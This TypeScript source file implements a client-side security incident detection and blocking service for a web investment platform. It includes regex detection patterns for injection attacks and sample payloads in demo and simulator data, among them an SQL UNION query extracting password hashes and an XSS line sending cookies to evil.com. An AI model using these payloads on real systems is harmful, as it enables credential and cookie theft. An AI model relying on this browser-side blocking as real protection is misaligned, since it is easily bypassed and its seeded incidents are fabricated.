/**
 * SOC EXCAISRES - Motor Autónomo de Ciberseguridad, Detección y Respuesta Activa (SOAR)
 * AL-HADIQA INVEST · Executive Cyber Automated Incident Surveillance & Response Ecosystem
 */

import {
  collection,
  addDoc,
  doc,
  setDoc,
  updateDoc,
  serverTimestamp,
} from 'firebase/firestore';
import { db } from '../firebase';
import { dispatchTransactionalEmail } from './emailService';
import {
  SocIncident,
  SocSettings,
  SocQuarantineEntry,
  SocPosture,
  AttackVector,
  ThreatSeverity,
  MitigationAction,
  SocStats,
  FirebaseAuthLogEntry,
  AdminSecurityAlert,
  AuthPatternType,
} from '../types/soc';

const INCIDENTS_COLLECTION = 'soc_incidents';
const SETTINGS_COLLECTION = 'soc_settings';
const SETTINGS_DOC_ID = 'current_posture';
const BLOCKLIST_COLLECTION = 'soc_blocklist';
const AUTH_LOGS_COLLECTION = 'firebase_auth_logs';
const ADMIN_EMAIL = 'empresaalhadiqainvest@gmail.com';

const LOCAL_STORAGE_INCIDENTS_KEY = 'alhadiqa_soc_incidents_cache';
const LOCAL_STORAGE_BLOCKLIST_KEY = 'alhadiqa_soc_blocklist_cache';
const LOCAL_STORAGE_SETTINGS_KEY = 'alhadiqa_soc_settings_cache';
const LOCAL_STORAGE_AUTH_LOGS_KEY = 'alhadiqa_soc_auth_logs_cache';
const LOCAL_STORAGE_ALERTS_KEY = 'alhadiqa_soc_admin_alerts_cache';

// Configuración por defecto de SOC EXCAISRES
export const DEFAULT_SOC_SETTINGS: SocSettings = {
  autoResponseEnabled: true,
  posture: 'NOMINAL',
  bruteForceThreshold: 3,
  rateLimitBurstMax: 20,
  honeypotInstantBan: true,
  injectionZeroTolerance: true,
  lockdownTriggerThreshold: 3,
  lastUpdated: new Date().toISOString(),
};

// Semilla de incidentes iniciales neutralizados institucionalmente para telemetría inicial
const INITIAL_DEMO_INCIDENTS: SocIncident[] = [
  {
    id: 'inc-ex-001',
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    attackVector: 'SQLI_INJECTION',
    severity: 'CRITICAL',
    sourceIp: '185.220.101.44',
    sourceFingerprint: 'tor-exit-node-de',
    targetEndpoint: '/api/mentor/chat',
    payloadSample: "' UNION SELECT null, email, password_hash FROM admin_users --",
    mitigationAction: 'BLOCKED_IMMEDIATELY',
    status: 'NEUTRALIZADO',
    autoResponseMs: 14,
    details: 'Inyección SQL clásica interceptada por el filtro de cargas maliciosas. IP aislada permanentemente.',
    userAgent: 'sqlmap/1.6.11#stable',
  },
  {
    id: 'inc-ex-002',
    timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    attackVector: 'BRUTE_FORCE',
    severity: 'HIGH',
    sourceIp: '45.154.255.89',
    sourceFingerprint: 'botnet-crawler-nl',
    targetEndpoint: '/auth/login-stream',
    payloadSample: 'rapid_attempt_burst: 6 failed tokens within 12s',
    mitigationAction: 'IP_QUARANTINED',
    status: 'EN_CUARENTENA',
    autoResponseMs: 22,
    details: 'Ráfaga de fuerza bruta contra tokens de acceso. IP enviada a cuarentena por 30 minutos.',
    userAgent: 'Python-requests/2.28.1',
  },
  {
    id: 'inc-ex-003',
    timestamp: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
    attackVector: 'HONEYPOT_TRIGGER',
    severity: 'MEDIUM',
    sourceIp: '194.26.29.112',
    sourceFingerprint: 'stealth-scraper-ru',
    targetEndpoint: '/components/NewsletterSection',
    payloadSample: 'field: b_fax_honeypot filled with "commercial_seo_bot"',
    mitigationAction: 'HONEYPOT_NEUTRALIZED',
    status: 'NEUTRALIZADO',
    autoResponseMs: 8,
    details: 'Trampa honeypot invisible activada por bot autónomo. Petición descartada sin procesar en base de datos.',
    userAgent: 'Mozilla/5.0 (compatible; Scrapy/2.9.0; +http://scrapy.org)',
  },
];

const INITIAL_DEMO_BLOCKLIST: SocQuarantineEntry[] = [
  {
    id: 'blk-001',
    identifier: '185.220.101.44',
    reason: 'Inyección SQL de alta severidad contra endpoint del Mentor',
    attackVector: 'SQLI_INJECTION',
    bannedAt: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    expiresAt: 'PERMANENT',
    status: 'ACTIVE',
  },
  {
    id: 'blk-002',
    identifier: '45.154.255.89',
    reason: 'Ataque de fuerza bruta de credenciales repetitivo',
    attackVector: 'BRUTE_FORCE',
    bannedAt: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    expiresAt: new Date(Date.now() + 1000 * 60 * 15).toISOString(),
    status: 'ACTIVE',
  },
];

class SocExcaisresEngine {
  private settings: SocSettings = DEFAULT_SOC_SETTINGS;
  private incidents: SocIncident[] = [];
  private blocklist: SocQuarantineEntry[] = [];
  private authLogs: FirebaseAuthLogEntry[] = [];
  private adminAlerts: AdminSecurityAlert[] = [];
  private recentFailures: Map<string, number[]> = new Map();
  private cachedClientIp: string | null = null;

  constructor() {
    this.loadFromCache();
  }

  private loadFromCache() {
    if (typeof window === 'undefined') return;
    try {
      const savedSettings = localStorage.getItem(LOCAL_STORAGE_SETTINGS_KEY);
      if (savedSettings) this.settings = { ...DEFAULT_SOC_SETTINGS, ...JSON.parse(savedSettings) };

      const savedIncidents = localStorage.getItem(LOCAL_STORAGE_INCIDENTS_KEY);
      this.incidents = savedIncidents ? JSON.parse(savedIncidents) : INITIAL_DEMO_INCIDENTS;

      const savedBlocklist = localStorage.getItem(LOCAL_STORAGE_BLOCKLIST_KEY);
      this.blocklist = savedBlocklist ? JSON.parse(savedBlocklist) : INITIAL_DEMO_BLOCKLIST;

      const savedAuthLogs = localStorage.getItem(LOCAL_STORAGE_AUTH_LOGS_KEY);
      this.authLogs = savedAuthLogs ? JSON.parse(savedAuthLogs) : [];

      const savedAlerts = localStorage.getItem(LOCAL_STORAGE_ALERTS_KEY);
      this.adminAlerts = savedAlerts ? JSON.parse(savedAlerts) : [];
    } catch (e) {
      console.warn('SOC EXCAISRES: Error cargando caché local:', e);
      this.incidents = INITIAL_DEMO_INCIDENTS;
      this.blocklist = INITIAL_DEMO_BLOCKLIST;
      this.authLogs = [];
      this.adminAlerts = [];
    }
  }

  private saveToCache() {
    if (typeof window === 'undefined') return;
    try {
      localStorage.setItem(LOCAL_STORAGE_SETTINGS_KEY, JSON.stringify(this.settings));
      localStorage.setItem(LOCAL_STORAGE_INCIDENTS_KEY, JSON.stringify(this.incidents));
      localStorage.setItem(LOCAL_STORAGE_BLOCKLIST_KEY, JSON.stringify(this.blocklist));
      localStorage.setItem(LOCAL_STORAGE_AUTH_LOGS_KEY, JSON.stringify(this.authLogs.slice(0, 100)));
      localStorage.setItem(LOCAL_STORAGE_ALERTS_KEY, JSON.stringify(this.adminAlerts.slice(0, 30)));
    } catch (_) {}
  }

  private inFlightIpPromise: Promise<string> | null = null;

  /**
   * Resuelve la IP del cliente desde /api/client-ip con fallback seguro y deduplicación
   */
  public async resolveClientIp(): Promise<string> {
    if (this.cachedClientIp) return this.cachedClientIp;
    if (this.inFlightIpPromise) return this.inFlightIpPromise;

    this.inFlightIpPromise = (async () => {
      try {
        const res = await fetch('/api/client-ip');
        if (res.ok) {
          const data = (await res.json()) as { ip?: string };
          if (data?.ip) {
            this.cachedClientIp = data.ip;
            return data.ip;
          }
        }
      } catch (_) {
        // Fallback en modo offline
      }
      this.cachedClientIp = '192.168.1.105';
      return this.cachedClientIp;
    })().finally(() => {
      this.inFlightIpPromise = null;
    });

    return this.inFlightIpPromise;
  }

  /**
   * Inspecciona texto en busca de firmas de inyección (SQLi, NoSQL, XSS, Path Traversal)
   */
  public inspectPayload(text: string): { isThreat: boolean; vector?: AttackVector; sample?: string } {
    if (!text || typeof text !== 'string') return { isThreat: false };

    const lower = text.toLowerCase();

    // 1. Patrones de Inyección SQL
    const sqliPatterns = [
      /(\%27)|(\')|(\-\-)|(\%23)|(#)/i,
      /\b(union(\s+all)?\s+select)\b/i,
      /\b(select\s+.+\s+from)\b/i,
      /\b(drop\s+table)\b/i,
      /\b(insert\s+into.+values)\b/i,
      /\b(or\s+['"]?1['"]?\s*=\s*['"]?1)/i,
      /\b(waitfor\s+delay)\b/i,
    ];

    for (const pattern of sqliPatterns) {
      if (pattern.test(lower)) {
        return { isThreat: true, vector: 'SQLI_INJECTION', sample: text.slice(0, 120) };
      }
    }

    // 2. Patrones XSS
    const xssPatterns = [
      /<script\b[^>]*>([\s\S]*?)<\/script>/i,
      /javascript:/i,
      /onerror\s*=/i,
      /onload\s*=/i,
      /<iframe\b/i,
      /<img[^>]+src[^\w]+x[^\w]+onerror/i,
    ];

    for (const pattern of xssPatterns) {
      if (pattern.test(lower)) {
        return { isThreat: true, vector: 'XSS_ATTACK', sample: text.slice(0, 120) };
      }
    }

    // 3. Patrones NoSQL
    if (lower.includes('$where') || lower.includes('$gt') || lower.includes('$ne') || lower.includes('$regex')) {
      return { isThreat: true, vector: 'NOSQL_INJECTION', sample: text.slice(0, 120) };
    }

    // 4. Path Traversal
    if (lower.includes('../') || lower.includes('..\\') || lower.includes('/etc/passwd') || lower.includes('win.ini')) {
      return { isThreat: true, vector: 'PATH_TRAVERSAL', sample: text.slice(0, 120) };
    }

    return { isThreat: false };
  }

  /**
   * Registra un fallo de autenticación y evalúa si excede el umbral de fuerza bruta
   */
  public registerAuthFailure(identifier: string): boolean {
    const now = Date.now();
    const timestamps = (this.recentFailures.get(identifier) || []).filter(
      (ts) => now - ts < 60000 // ventana de 60 segundos
    );
    timestamps.push(now);
    this.recentFailures.set(identifier, timestamps);

    if (timestamps.length >= this.settings.bruteForceThreshold) {
      // Disparar auto-mitigación inmediata por fuerza bruta
      this.detectAndMitigate({
        attackVector: 'BRUTE_FORCE',
        severity: 'HIGH',
        sourceIp: identifier,
        targetEndpoint: '/auth/google-flow',
        payloadSample: `Excedido umbral de fuerza bruta (${timestamps.length} intentos fallidos en 60s)`,
        details: 'Intento masivo de adivinación o credenciales stuffing.',
      });
      return true; // Umbral excedido
    }
    return false;
  }

  /**
   * Verifica si un identificador (IP o cuenta) está actualmente en cuarentena activa
   */
  public isQuarantined(identifier: string): boolean {
    if (!identifier) return false;
    const normalized = identifier.toLowerCase().trim();
    const entry = this.blocklist.find(
      (b) => b.identifier.toLowerCase().trim() === normalized && b.status === 'ACTIVE'
    );
    if (!entry) return false;

    if (entry.expiresAt === 'PERMANENT') return true;

    const expiresTime = new Date(entry.expiresAt).getTime();
    if (Date.now() < expiresTime) {
      return true;
    } else {
      // Expiró la cuarentena
      entry.status = 'PARDONED';
      this.saveToCache();
      return false;
    }
  }

  /**
   * Retorna los milisegundos restantes de bloqueo para un identificador o null si no está bloqueado
   */
  public getQuarantineRemainingMs(identifier: string): number | null {
    if (!identifier) return null;
    const normalized = identifier.toLowerCase().trim();
    const entry = this.blocklist.find(
      (b) => b.identifier.toLowerCase().trim() === normalized && b.status === 'ACTIVE'
    );
    if (!entry) return null;
    if (entry.expiresAt === 'PERMANENT') return Infinity;

    const remaining = new Date(entry.expiresAt).getTime() - Date.now();
    if (remaining <= 0) {
      entry.status = 'PARDONED';
      this.saveToCache();
      return null;
    }
    return remaining;
  }

  /**
   * Núcleo del SOAR de SOC EXCAISRES: Detección y Auto-Mitigación en Tiempo Real
   */
  public async detectAndMitigate(params: {
    attackVector: AttackVector;
    severity?: ThreatSeverity;
    sourceIp?: string;
    targetEndpoint?: string;
    payloadSample?: string;
    details?: string;
    userAgent?: string;
    quarantineMinutes?: number | 'PERMANENT';
    targetType?: 'IP' | 'ACCOUNT' | 'FINGERPRINT';
    mitigationActionOverride?: MitigationAction;
  }): Promise<SocIncident> {
    const start = performance.now();
    const incidentId = `inc-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`;
    const ip = params.sourceIp || '192.168.1.105';
    const severity: ThreatSeverity = params.severity || this.calculateSeverity(params.attackVector);

    // Determinar la acción de auto-mitigación basada en reglas SOAR activas
    let mitigationAction: MitigationAction = params.mitigationActionOverride || 'BLOCKED_IMMEDIATELY';
    let incidentStatus: 'NEUTRALIZADO' | 'EN_CUARENTENA' = 'NEUTRALIZADO';

    if (!params.mitigationActionOverride) {
      if (params.attackVector === 'HONEYPOT_TRIGGER') {
        mitigationAction = 'HONEYPOT_NEUTRALIZED';
      } else if (params.attackVector === 'BRUTE_FORCE' || params.attackVector === 'CREDENTIAL_SPRAYING') {
        mitigationAction = params.targetType === 'ACCOUNT' ? 'ACCOUNT_QUARANTINED' : 'IP_QUARANTINED';
        incidentStatus = 'EN_CUARENTENA';
      } else if (params.attackVector === 'RATE_LIMIT_FLOOD') {
        mitigationAction = 'RATE_THROTTLED';
      } else if (params.attackVector === 'SESSION_TAMPERING') {
        mitigationAction = 'SESSION_REVOKED';
      }
    } else if (
      params.mitigationActionOverride === 'IP_QUARANTINED' ||
      params.mitigationActionOverride === 'ACCOUNT_QUARANTINED'
    ) {
      incidentStatus = 'EN_CUARENTENA';
    }

    // Cuarentena automática en la lista de bloqueo si la respuesta automática está activada
    if (this.settings.autoResponseEnabled) {
      const duration =
        params.quarantineMinutes !== undefined
          ? params.quarantineMinutes
          : severity === 'CRITICAL'
          ? 'PERMANENT'
          : 15; // 15 minutos por defecto para amenazas de autenticación / fuerza bruta

      this.quarantineIdentifier(
        ip,
        params.details || `Neutralizado por SOC EXCAISRES (${params.attackVector})`,
        params.attackVector,
        duration,
        params.targetType || 'IP'
      );
    }

    const elapsedMs = Math.max(4, Math.round(performance.now() - start));

    const incident: SocIncident = {
      id: incidentId,
      timestamp: new Date().toISOString(),
      attackVector: params.attackVector,
      severity,
      sourceIp: ip,
      sourceFingerprint: `fp-${ip.replace(/\./g, '')}-${Date.now().toString(36)}`,
      targetEndpoint: params.targetEndpoint || '/api/general',
      payloadSample: (params.payloadSample || 'N/A').slice(0, 160),
      mitigationAction,
      status: incidentStatus,
      autoResponseMs: elapsedMs,
      details: params.details || `Amenaza ${params.attackVector} neutralizada automáticamente en ${elapsedMs}ms por el motor SOAR.`,
      userAgent: params.userAgent || (typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown Client'),
    };

    // Añadir al historial local
    this.incidents = [incident, ...this.incidents].slice(0, 50); // Guardar hasta 50 incidentes recientes

    // Evaluar elevación de postura a LOCKDOWN si hay saturación de incidentes críticos
    this.evaluatePostureElevation();

    this.saveToCache();

    // Sincronizar en Firestore si el usuario está conectado
    this.persistIncidentToFirestore(incident);

    // Disparar evento DOM para notificaciones o actualización en tiempo real en la UI
    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('soc_incident_detected', { detail: incident }));
    }

    return incident;
  }

  private calculateSeverity(vector: AttackVector): ThreatSeverity {
    switch (vector) {
      case 'SQLI_INJECTION':
      case 'PATH_TRAVERSAL':
      case 'SESSION_TAMPERING':
        return 'CRITICAL';
      case 'XSS_ATTACK':
      case 'NOSQL_INJECTION':
      case 'BRUTE_FORCE':
        return 'HIGH';
      case 'RATE_LIMIT_FLOOD':
      case 'HONEYPOT_TRIGGER':
        return 'MEDIUM';
      default:
        return 'LOW';
    }
  }

  /**
   * Coloca en cuarentena una IP, cuenta o identificador por la duración indicada (ej. 15 minutos)
   */
  public quarantineForDuration(
    identifier: string,
    reason: string,
    vector: AttackVector,
    durationMinutes: number | 'PERMANENT',
    targetType: 'IP' | 'ACCOUNT' | 'FINGERPRINT' = 'IP'
  ): SocQuarantineEntry {
    return this.quarantineIdentifier(identifier, reason, vector, durationMinutes, targetType);
  }

  private quarantineIdentifier(
    identifier: string,
    reason: string,
    vector: AttackVector,
    durationMinutes: number | 'PERMANENT',
    targetType: 'IP' | 'ACCOUNT' | 'FINGERPRINT' = 'IP'
  ): SocQuarantineEntry {
    const normalized = identifier.trim();
    const existing = this.blocklist.find(
      (b) => b.identifier.toLowerCase() === normalized.toLowerCase()
    );
    const expiresAt =
      durationMinutes === 'PERMANENT'
        ? 'PERMANENT'
        : new Date(Date.now() + durationMinutes * 60 * 1000).toISOString();

    let resultEntry: SocQuarantineEntry;
    if (existing) {
      existing.status = 'ACTIVE';
      existing.reason = reason;
      existing.attackVector = vector;
      existing.targetType = targetType;
      existing.bannedAt = new Date().toISOString();
      existing.expiresAt = expiresAt;
      resultEntry = existing;
    } else {
      resultEntry = {
        id: `blk-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 5)}`,
        identifier: normalized,
        targetType,
        reason,
        attackVector: vector,
        bannedAt: new Date().toISOString(),
        expiresAt,
        status: 'ACTIVE',
      };
      this.blocklist = [resultEntry, ...this.blocklist];
    }

    this.saveToCache();
    this.persistBlocklistToFirestore();
    return resultEntry;
  }

  /**
   * Registra un evento de autenticación de Firebase (fallo, éxito o bloqueo) para monitoreo continuo
   */
  public async logFirebaseAuthAttempt(params: {
    email?: string;
    sourceIp?: string;
    errorCode?: string;
    errorMessage?: string;
    provider?: string;
    outcome: 'FAILED' | 'SUCCESS' | 'BLOCKED';
    detectedPattern?: string;
    mitigated?: boolean;
  }): Promise<FirebaseAuthLogEntry> {
    const ip = params.sourceIp || (await this.resolveClientIp());
    const entry: FirebaseAuthLogEntry = {
      id: `authlog-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: new Date().toISOString(),
      email: params.email?.trim() || 'cuenta-no-identificada',
      sourceIp: ip,
      errorCode: params.errorCode || (params.outcome === 'SUCCESS' ? 'auth/ok' : 'auth/unknown'),
      errorMessage: params.errorMessage || '',
      provider: params.provider || 'google.com',
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown Client',
      outcome: params.outcome,
      mitigated: Boolean(params.mitigated),
      detectedPattern: params.detectedPattern,
    };

    this.authLogs = [entry, ...this.authLogs].slice(0, 100);
    this.saveToCache();

    try {
      await setDoc(doc(db, AUTH_LOGS_COLLECTION, entry.id), entry);
    } catch (_) {
      // Resiliente en caché local si no hay conectividad Firestore
    }

    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('soc_auth_log_added', { detail: entry }));
    }

    return entry;
  }

  public getAuthLogs(): FirebaseAuthLogEntry[] {
    return [...this.authLogs];
  }

  public getAdminAlerts(): AdminSecurityAlert[] {
    return [...this.adminAlerts];
  }

  /**
   * Marca un lote de logs de autenticación como ya analizados y mitigados
   */
  public async markAuthLogsMitigated(logIds: string[], detectedPattern: string) {
    if (logIds.length === 0) return;

    const idSet = new Set(logIds);
    this.authLogs = this.authLogs.map((log) =>
      idSet.has(log.id) ? { ...log, mitigated: true, detectedPattern } : log
    );
    this.saveToCache();

    for (const logId of logIds) {
      try {
        await updateDoc(doc(db, AUTH_LOGS_COLLECTION, logId), {
          mitigated: true,
          detectedPattern,
        });
      } catch (_) {
        // Ignorar si el doc solo existía en caché local
      }
    }
  }

  /**
   * Notifica al Administrador Maestro (in-app en /notifications, email transaccional y alerta en vivo SOC)
   */
  public async notifyAdministratorSecurityAlert(params: {
    targetIdentifier: string;
    targetType: 'IP' | 'ACCOUNT';
    patternType: AuthPatternType;
    failedAttemptsCount: number;
    blockedMinutes: number;
    expiresAt: string;
    reason: string;
  }): Promise<AdminSecurityAlert> {
    const title = `🚨 SOC EXCAISRES: ${params.targetType === 'IP' ? 'IP' : 'Cuenta'} bloqueada ${params.blockedMinutes} min (${params.targetIdentifier})`;
    const message = `Patrón inusual detectado (${params.patternType}): ${params.failedAttemptsCount} intentos fallidos en Firebase Auth. ${params.reason} Bloqueo automático activo hasta ${new Date(params.expiresAt).toLocaleTimeString('es-ES')}.`;

    const alert: AdminSecurityAlert = {
      id: `alert-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 5)}`,
      createdAt: new Date().toISOString(),
      title,
      message,
      targetIdentifier: params.targetIdentifier,
      patternType: params.patternType,
      blockedMinutes: params.blockedMinutes,
      expiresAt: params.expiresAt,
      notifiedEmail: ADMIN_EMAIL,
    };

    this.adminAlerts = [alert, ...this.adminAlerts].slice(0, 30);
    this.saveToCache();

    // 1. Notificación en Firestore /notifications para el Administrador
    try {
      await addDoc(collection(db, 'notifications'), {
        title,
        message,
        category: 'sistema',
        targetRole: 'admin',
        type: 'urgent',
        readBy: [],
        actionLabel: 'Abrir SOC EXCAISRES',
        createdAt: serverTimestamp(),
      });
    } catch (_) {}

    // 2. Registro de correo de alerta al Administrador Maestro
    try {
      await dispatchTransactionalEmail({
        userId: 'admin_master_soc',
        toEmail: ADMIN_EMAIL,
        toName: 'Sr. Smith (Administrador Maestro)',
        templateType: 'sistema',
        subject: title,
        htmlContent: `
          <div style="font-family:sans-serif;background:#070b14;color:#f8fafc;padding:24px;border-radius:12px;border:1px solid #ef4444;">
            <h2 style="color:#f87171;margin-top:0;">${title}</h2>
            <p>${message}</p>
            <p style="color:#94a3b8;font-size:13px;">Generado automáticamente por el monitor de logs de Firebase Authentication de SOC EXCAISRES.</p>
          </div>
        `,
        plainText: message,
        createInAppNotification: false,
      });
    } catch (_) {}

    if (typeof window !== 'undefined') {
      window.dispatchEvent(new CustomEvent('soc_admin_alert', { detail: alert }));
    }

    return alert;
  }

  private evaluatePostureElevation() {
    const recentCritical = this.incidents.filter((i) => {
      const isCritical = i.severity === 'CRITICAL' || i.severity === 'HIGH';
      const isRecent = Date.now() - new Date(i.timestamp).getTime() < 5 * 60 * 1000;
      return isCritical && isRecent;
    });

    if (recentCritical.length >= this.settings.lockdownTriggerThreshold) {
      this.settings.posture = 'LOCKDOWN';
    } else if (recentCritical.length >= 1) {
      if (this.settings.posture !== 'LOCKDOWN') this.settings.posture = 'ELEVADA';
    }
  }

  private async persistIncidentToFirestore(incident: SocIncident) {
    try {
      await setDoc(doc(db, INCIDENTS_COLLECTION, incident.id), incident);
    } catch (_) {
      // Si el cliente no tiene sesión de admin o está offline, se conserva en caché local de SOC
    }
  }

  private async persistBlocklistToFirestore() {
    try {
      // Guardar entradas activas
      for (const entry of this.blocklist.slice(0, 10)) {
        await setDoc(doc(db, BLOCKLIST_COLLECTION, entry.id), entry, { merge: true });
      }
    } catch (_) {}
  }

  public getStats(): SocStats {
    const activeBlocks = this.blocklist.filter((b) => b.status === 'ACTIVE').length;
    const criticalCount = this.incidents.filter((i) => i.severity === 'CRITICAL').length;
    const avgResponse = this.incidents.length > 0
      ? Math.round(this.incidents.reduce((acc, i) => acc + i.autoResponseMs, 0) / this.incidents.length)
      : 18;

    return {
      totalThreatsNeutralized: this.incidents.length,
      activeQuarantineCount: activeBlocks,
      avgResponseMs: avgResponse,
      criticalIncidentCount: criticalCount,
      posture: this.settings.posture,
      autoResponseStatus: this.settings.autoResponseEnabled,
    };
  }

  public getIncidents(): SocIncident[] {
    return [...this.incidents];
  }

  public getBlocklist(): SocQuarantineEntry[] {
    return [...this.blocklist];
  }

  public getSettings(): SocSettings {
    return { ...this.settings };
  }

  public setPosture(posture: SocPosture) {
    this.settings.posture = posture;
    this.settings.lastUpdated = new Date().toISOString();
    this.saveToCache();
    try {
      setDoc(doc(db, SETTINGS_COLLECTION, SETTINGS_DOC_ID), this.settings, { merge: true });
    } catch (_) {}
  }

  public toggleAutoResponse(enabled: boolean) {
    this.settings.autoResponseEnabled = enabled;
    this.settings.lastUpdated = new Date().toISOString();
    this.saveToCache();
    try {
      setDoc(doc(db, SETTINGS_COLLECTION, SETTINGS_DOC_ID), this.settings, { merge: true });
    } catch (_) {}
  }

  public pardonEntity(blockId: string) {
    const entry = this.blocklist.find((b) => b.id === blockId);
    if (entry) {
      entry.status = 'PARDONED';
      this.saveToCache();
      try {
        updateDoc(doc(db, BLOCKLIST_COLLECTION, blockId), { status: 'PARDONED' });
      } catch (_) {}
    }
  }

  public addManualBlock(identifier: string, reason: string) {
    this.quarantineIdentifier(identifier, reason, 'MALICIOUS_USER_AGENT', 'PERMANENT');
    this.saveToCache();
  }

  public clearResolvedIncidents() {
    this.incidents = this.incidents.filter((i) => i.status === 'EN_CUARENTENA');
    this.saveToCache();
  }

  /**
   * Simulador de Ciberataque para comprobación visual del Administrador
   */
  public async simulateAttackScenario(
    type: 'SQLI' | 'BRUTE_FORCE' | 'HONEYPOT' | 'DDOS_FLOOD' | 'XSS'
  ): Promise<SocIncident> {
    switch (type) {
      case 'SQLI':
        return this.detectAndMitigate({
          attackVector: 'SQLI_INJECTION',
          severity: 'CRITICAL',
          sourceIp: `198.51.100.${Math.floor(Math.random() * 200 + 10)}`,
          targetEndpoint: '/api/mentor/chat',
          payloadSample: "admin' OR 1=1; DROP TABLE users; --",
          details: 'Simulación de inyección SQL ejecutada por el Administrador. Neutralización y bloqueo instantáneo activados.',
        });

      case 'BRUTE_FORCE':
        return this.detectAndMitigate({
          attackVector: 'BRUTE_FORCE',
          severity: 'HIGH',
          sourceIp: `203.0.113.${Math.floor(Math.random() * 200 + 10)}`,
          targetEndpoint: '/auth/google-sign-in',
          payloadSample: '4 intentos consecutivos con tokens revocados en <4s',
          details: 'Simulación de fuerza bruta contra autenticación. Cuarentena de IP y revocación inmediata.',
        });

      case 'HONEYPOT':
        return this.detectAndMitigate({
          attackVector: 'HONEYPOT_TRIGGER',
          severity: 'MEDIUM',
          sourceIp: `192.0.2.${Math.floor(Math.random() * 200 + 10)}`,
          targetEndpoint: '/components/NewsletterSection',
          payloadSample: 'b_fax_honeypot: "automated_spam_bot_v2"',
          details: 'Simulación de activación de trampa honeypot invisible. Envío interceptado en cliente.',
        });

      case 'DDOS_FLOOD':
        return this.detectAndMitigate({
          attackVector: 'RATE_LIMIT_FLOOD',
          severity: 'HIGH',
          sourceIp: `198.18.${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 200)}`,
          targetEndpoint: '/api/market/sentiment',
          payloadSample: '28 peticiones concurrentes en 800ms',
          details: 'Simulación de inundación DDoS. Throttling de tasa aplicado y degradación controlada.',
        });

      case 'XSS':
        return this.detectAndMitigate({
          attackVector: 'XSS_ATTACK',
          severity: 'HIGH',
          sourceIp: `198.51.100.${Math.floor(Math.random() * 200 + 10)}`,
          targetEndpoint: '/components/FeedbackModal',
          payloadSample: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
          details: 'Simulación de Cross-Site Scripting (XSS). Payload sanitizado y neutralizado por el blindaje web.',
        });
    }
  }

  /**
   * Genera informe ejecutivo de ciberseguridad en formato texto para exportación
   */
  public generateSecurityReportMarkdown(): string {
    const stats = this.getStats();
    const dateStr = new Date().toLocaleString('es-ES', { dateStyle: 'full', timeStyle: 'medium' });

    let md = `# INFORME OFICIAL DE CIBERSEGURIDAD · SOC EXCAISRES\n`;
    md += `**AL-HADIQA INVEST & Ecosistema Digital**\n`;
    md += `**Fecha de Emisión:** ${dateStr}\n`;
    md += `**Postura de Seguridad:** ${stats.posture}\n`;
    md += `**Modo Autónomo SOAR:** ${stats.autoResponseStatus ? 'ACTIVADO (100% Autónomo)' : 'SUPERVISADO'}\n\n`;

    md += `## 1. Métricas Clave de Operación\n`;
    md += `- Amenazas Neutralizadas en el Período: ${stats.totalThreatsNeutralized}\n`;
    md += `- Entidades en Cuarentena Activa: ${stats.activeQuarantineCount}\n`;
    md += `- Latencia Media de Auto-Mitigación: ${stats.avgResponseMs} ms\n`;
    md += `- Incidentes de Severidad Crítica: ${stats.criticalIncidentCount}\n\n`;

    md += `## 2. Registro Reciente de Incidentes Neutralizados\n\n`;
    md += `| ID | Timestamp | Vector | Severidad | IP Origen | Acción Mitigación | Latencia |\n`;
    md += `|---|---|---|---|---|---|---|\n`;

    for (const inc of this.incidents.slice(0, 15)) {
      md += `| ${inc.id} | ${new Date(inc.timestamp).toLocaleTimeString()} | ${inc.attackVector} | ${inc.severity} | ${inc.sourceIp} | ${inc.mitigationAction} | ${inc.autoResponseMs}ms |\n`;
    }

    md += `\n\n---\n*Generado por SOC EXCAISRES · Smith Business Solutions & AL-HADIQA INVEST*\n`;
    return md;
  }
}

// Exportar instancia singleton
export const socService = new SocExcaisresEngine();
